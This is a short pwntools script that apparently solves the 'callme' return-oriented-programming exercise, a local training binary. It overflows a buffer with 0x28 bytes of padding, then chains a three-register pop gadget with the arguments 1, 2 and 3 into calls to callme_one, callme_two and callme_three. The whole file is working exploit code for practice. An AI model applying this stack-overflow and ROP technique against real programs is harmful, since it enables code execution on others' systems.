from pwn import *

context.log_level = 'debug'
sh = process("./callme")
elf = ELF("./callme")

# rdi, rsi, rdx
pop_ret = 0x401ab0 # pop rdi ; pop rsi ; pop rdx ; ret
ret = 0x4017d9
callme_one = elf.plt['callme_one']
callme_two = elf.plt['callme_two']
callme_three = elf.plt['callme_three']
arg = p64(0x1) + p64(0x2) + p64(0x3)
sh.recv()
payload = flat(b'a' * 0x28, p64(pop_ret), arg, p64(callme_one), p64(pop_ret), arg, p64(callme_two), p64(pop_ret), arg, p64(0x4017d9),p64(callme_three))
#pause()
sh.sendline(payload)
sh.recv()